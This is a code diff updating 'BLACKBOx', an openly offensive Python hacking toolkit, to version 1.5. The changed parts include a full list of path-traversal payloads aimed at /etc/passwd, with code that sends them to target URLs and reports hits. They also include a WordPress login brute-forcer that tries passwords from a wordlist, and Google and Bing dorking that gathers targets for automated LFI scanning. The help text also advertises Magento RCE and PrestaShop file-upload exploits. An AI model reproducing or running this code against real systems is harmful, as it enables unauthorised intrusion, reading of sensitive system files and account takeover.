@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
 #####################################NOTICE######################################
 ###     This program is free software: you can redistribute it and/or modify  ###
 ###     it under the terms of the GNU General Public License as published by  ###
@@ -19,7 +19,7 @@
 ### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259 ###
 ### ADMIN PAGE FINDER  : https://packetstormsecurity.com/files/112855/Admin-Page-Finder-Script.html                          ###
 ################################################################################################################################
-import requests,json,sys, time, re, os, base64, random,hashlib,timeit,ftplib,pexpect
+import requests,json,sys, time, re, os, base64, random,hashlib,timeit,ftplib,pexpect,urllib2
 from sys import platform
 from time import gmtime, strftime
 from optparse import OptionParser
@@ -30,16 +30,16 @@ __author__     = 'BLACK EYE'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
 __emailadd__   = 'blackdoor197@riseup.net'
 __twitter__    = 'https://twitter.com/0x676'
-__version__    = '1.4'
+__version__    = '1.5'
 __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOx v%s' % (__version__)
 
 def __banner__():
-	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ "
-	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     | _ _"
-	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  ||_'_|"
-	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____||_,_|"
-	print color.W+color.BOLD+"                                                {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC
+	print (color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ ")
+	print (color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     | _ _")
+	print (color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  ||_'_|")
+	print (color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____||_,_|")
+	print (color.W+color.BOLD+"                                                {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC)
 
 def __help__():
 	print (color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}")
@@ -56,8 +56,8 @@ def __help__():
 	print ("\t+ Magento Rce           : rce_magento            | Magento eCommerce - Remote Code Execution")
 	print ("\t+ PrestaShop Exploit    : presta_exploit         | Prestashop Multi Modules Arbitrary File Upload Exploit")
 	print (color.BOLD+color.Y+"Dorking : "+color.ENDC)
-	print ("\t+ Google Dorker         : google_dorker(lfi scan)| Google Dorker ")
-	print ("\t+ Bing Dorker           : bing_dorker(lfi scan)  | Bing Dorker via IP")
+	print ("\t+ Google Dorker         : google_dorker(LFI)| Google Dorker ")
+	print ("\t+ Bing Dorker           : bing_dorker(LFI)  | Bing Dorker via IP")
 	print (color.BOLD+color.Y+"Cracking : "+color.ENDC)
 	print ("\t+ Crack Hash MD5-SHA512 : hash_killer            | Crack MD5-SHA* HASH\n\t\t     SHA1-SHA224\n\t\t     SHA256-SHA384")
 
@@ -100,72 +100,76 @@ class color:
 ####################################
 
 class checker:
-	def lfi(self, url):
-		LFI = []
-		def lfi_link(url):
-			payloads=[
-			"../etc/passwd",
-			"../etc/passwd%00",
-			"../../etc/passwd",
-			"../../etc/passwd%00",
-			"../../../etc/passwd",
-			"../../../etc/passwd%00",
-			"../../../../etc/passwd",
-			"../../../../etc/passwd%00",
-			"../../../../../etc/passwd",
-			"../../../../../etc/passwd%00",
-			"../../../../../../etc/passwd",
-			"../../../../../../etc/passwd%00",
-			"../../../../../../../etc/passwd",
-			"../../../../../../../etc/passwd%00",
-			"../../../../../../../../etc/passwd",
-			"../../../../../../../../etc/passwd%00",
-			"../../../../../../../../../etc/passwd",
-			"../../../../../../../../../etc/passwd%00",
-			"../../../../../../../../../../etc/passwd",
-			"../../../../../../../../../../etc/passwd%00",
-			"../../../../../../../../../../../etc/passwd",
-			"../../../../../../../../../../../etc/passwd%00",
-			"../../../../../../../../../../../../etc/passwd",
-			"../../../../../../../../../../../../etc/passwd%00",
-			"..%2Fetc%2Fpasswd",
-			"..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
-			lfi = re.findall(r'=(.*)', url)
-			for i in lfi:
-				l=re.sub(i, '', url)
-				for payload in payloads:
-					payload=payload.strip()
-					lfi = l+payload
-					LFI.append(lfi)
-		lfi_link(url)
-		for i in LFI:
-			r = requests.get(i)
-			if "root" in r.content:
-				print color.W+color.BOLD+"LFI FOUND :"+color.Y+i+color.ENDC
-			else:
-				print "Not Found : "+i
+    def lfi(self, url):
+        payloads=[
+        "../etc/passwd",
+        "../etc/passwd%00",
+        "../../etc/passwd",
+        "../../etc/passwd%00",
+        "../../../etc/passwd",
+        "../../../etc/passwd%00",
+        "../../../../etc/passwd",
+        "../../../../etc/passwd%00",
+        "../../../../../etc/passwd",
+        "../../../../../etc/passwd%00",
+        "../../../../../../etc/passwd",
+        "../../../../../../etc/passwd%00",
+        "../../../../../../../etc/passwd",
+        "../../../../../../../etc/passwd%00",
+        "../../../../../../../../etc/passwd",
+        "../../../../../../../../etc/passwd%00",
+        "../../../../../../../../../etc/passwd",
+        "../../../../../../../../../etc/passwd%00",
+        "../../../../../../../../../../etc/passwd",
+        "../../../../../../../../../../etc/passwd%00",
+        "../../../../../../../../../../../etc/passwd",
+        "../../../../../../../../../../../etc/passwd%00",
+        "../../../../../../../../../../../../etc/passwd",
+        "../../../../../../../../../../../../etc/passwd%00",
+        "..%2Fetc%2Fpasswd",
+        "..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
+        lfi = re.findall(r'=(.*)', url)
+        for i in lfi:
+            print (color.C+color.BOLD+"[+] "+color.BL+"TARGET"+color.W+" : "+color.ENDC+url+color.ENDC)
+            print (color.R+"------------------------------------------------------------------"+color.ENDC)	
+            l=re.sub(i, '', url)
+            for payload in payloads:
+                payload=payload.strip()
+                print (color.W+color.BOLD+"[+] "+color.BL+"Payload "+color.W+"  : "+color.ENDC+payload+color.ENDC)
+                lfii = l+payload
+                r = requests.get(lfii)
+                code = str(r.status_code)
+                html = r.content
+                if "root" in html:
+                	print (color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
+                	print (color.Y+color.BOLD+"[+] "+color.BL+"LFI FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
+                	print (color.R+"------------------------------------------------------------------"+color.ENDC)	
+                else:
+                	print (color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
+                	print (color.R+color.BOLD+"[+] "+color.BL+"NOT FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
+                	print (color.R+"------------------------------------------------------------------"+color.ENDC)	
 	def sqli(self, url):
 		pass
 
@@ -261,14 +265,14 @@ class dorker:
 						self.gurl.append(link)
 						gopen.write(str(link+"\n"))
 				start+=10
-			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND"
+			print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND")
 		tldd = randomm()
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC
+		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd)
+		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC)
 		run(dork, start, stop)
 	def bing(self, ip,dork):
 		url = []
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
+		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork)
 		page = 0
 		bopen = open("burl.txt","a")
 		while page <= 102:
@@ -281,7 +285,7 @@ class dorker:
 				self.burl.append(i)
 				bopen.write(i+"\n")
 			page += 50
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC
+		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC)
 	pass
 
 
@@ -524,10 +528,10 @@ class BruteForce:
 
 		url = "http://"+url+"/wp-login.php"
 		if not requests.get(url).status_code == 200:
-			print "Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code)
+			print ("Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code))
 			return 1
-		print color.G+datetime+color.ENDC+" Starting Attack ! "
-		print color.G+datetime+color.W+" wordpress  : "+color.Y+url
+		print (color.G+datetime+color.ENDC+" Starting Attack ! ")
+		print (color.G+datetime+color.W+" wordpress  : "+color.Y+url)
 		word = open(wordlist, 'r')
 		word = word.readlines()
 		for words in word:
@@ -537,15 +541,15 @@ class BruteForce:
 			           'pwd' : words}
 			
 			s = requests.post(url, data=payload, headers=headers)
-			print color.R+"------------------------------------------------------------------"
-			print color.G+datetime+color.W+" username   : "+color.Y+payload['log']
-			print color.G+datetime+color.W+" password   : "+color.Y+payload['pwd']
+			print (color.R+"------------------------------------------------------------------")
+			print (color.G+datetime+color.W+" username   : "+color.Y+payload['log'])
+			print (color.G+datetime+color.W+" password   : "+color.Y+payload['pwd'])
 			if "wp-admin" in s.url:
-				print color.G+datetime+color.R+" Login Succes"+color.ENDC
-				print color.R+"------------------------------------------------------------------"+color.ENDC				
+				print (color.G+datetime+color.R+" Login Succes"+color.ENDC)
+				print (color.R+"------------------------------------------------------------------"+color.ENDC)			
 				break
 			elif "wp-login.php" in s.url:
-				print color.G+datetime+color.C+" Login False"+color.ENDC
+				print (color.G+datetime+color.C+" Login False"+color.ENDC)
 	def ftp_brute(self,hostname, username, password):
 		try:
 			ftp = FTP(hostname)
@@ -672,15 +676,15 @@ class dnsinfo:
 			return ok
 		
 		def rzlt(details):
-			print color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC
-			print color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC
-			print color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC
+			print (color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC)
+			print (color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC)
+			print (color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC)
 			ipp = details['remoteIpAddress']
 			rzt = open(ipp+".txt" ,'a')
 			for domains,bl in details['domainArray']:
 				rzt.write(domains+"\n")
 			rzt.close
-			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
+			print (color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC)
 		details = Details()
 		rzlt(details)
 	def viewdns(self,ip):
@@ -695,8 +699,8 @@ class dnsinfo:
 		for i in sites:
 			i=i.strip()
 			ipp.write(i+"\n")
-		print color.W+color.BOLD+"[+] "+str(len(sites))+" FOUND"+color.ENDC
-		print color.W+color.BOLD+"[+] Domains is saved in "+ip+".txt"+color.ENDC
+		print (color.W+color.BOLD+"[+] "+str(len(sites))+" FOUND"+color.ENDC)
+		print (color.W+color.BOLD+"[+] Domains is saved in "+ip+".txt"+color.ENDC)
 	def hackertarget(self,domain):
 		urll = []
 		url = "http://api.hackertarget.com/reverseiplookup/?q="+domain
@@ -712,8 +716,8 @@ class dnsinfo:
 				i = i.strip()
 				urll.append(i)
 				ipp.write(i+"\n")
-			print color.W+color.BOLD+"[+] "+str(len(black))+" FOUND"+color.ENDC
-			print color.W+color.BOLD+"[+] Domains is saved in "+domain+".txt"+color.ENDC
+			print (color.W+color.BOLD+"[+] "+str(len(black))+" FOUND"+color.ENDC)
+			print (color.W+color.BOLD+"[+] Domains is saved in "+domain+".txt"+color.ENDC)
 
 ###
 ###HASH CRACKER
@@ -1012,7 +1016,7 @@ def __main__():
 				errors.append("[-] No Wordlist path specified.")
 			if (len(errors) > 0):
 				for error in errors:
-					print color.BOLD+error+color.ENDC
+					print (color.BOLD+error+color.ENDC)
 
 
 		if (arg == "dns_info"):
@@ -1062,21 +1066,18 @@ def __main__():
 			parser = OptionParser()
 			parser.add_option("--dork","-d",
 				help="Dork for get URL")
-			parser.add_option("--start",type=int,default=0,
-				help="Number of page for start")
-			parser.add_option("--stop",type=int,
+			parser.add_option("--level",type=int,default=10,
 				help="Number of page to stop")
 			parser.add_option("--lfi",
 			help="Scan Founded website from LFI", action="store_true")
 			(options,args) = parser.parse_args()
 			dork = options.dork
-			start = options.start
-			stop = options.stop
+			level = options.level
 			lfi = options.lfi
-			if dork and start is not None and stop is not None: 
-				dorker().google(dork, start, stop)
-			if  dork and start is not None and stop is not None and lfi==True:
-				print color.R+color.BOLD+"LFI Scanner : "+color.ENDC
+			if dork and level is not None: 
+				dorker().google(dork, 0, level)
+			if  dork and level is not None and lfi==True:
+				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
 				gurl= dorker().gurl
 				for urll in gurl:
 					urll= urll.strip()
@@ -1097,7 +1098,7 @@ def __main__():
 			if ip and dork:
 				dorker().bing(ip,dork)
 			if ip and dork and lfi==True:
-				print color.R+color.BOLD+"LFI Scanner : "+color.ENDC
+				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
 				burl= dorker().burl
 				for urll in burl:
 					urll= urll.strip()
@@ -1243,7 +1244,7 @@ if __name__ == '__main__':
 	try:
 		__main__()
 	except KeyboardInterrupt:
-		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
+		print (color.BOLD+color.Y+"Exiting Now !"+color.ENDC)
 		sys.exit(0)
-	except IOError:
-		print color.BOLD+color.Y+"Error No wordlist Selected"+color.ENDC
+	except urllib2.HTTPError:
+		print (color.BOLD+color.Y+"Error, Retry Later !"+color.ENDC)
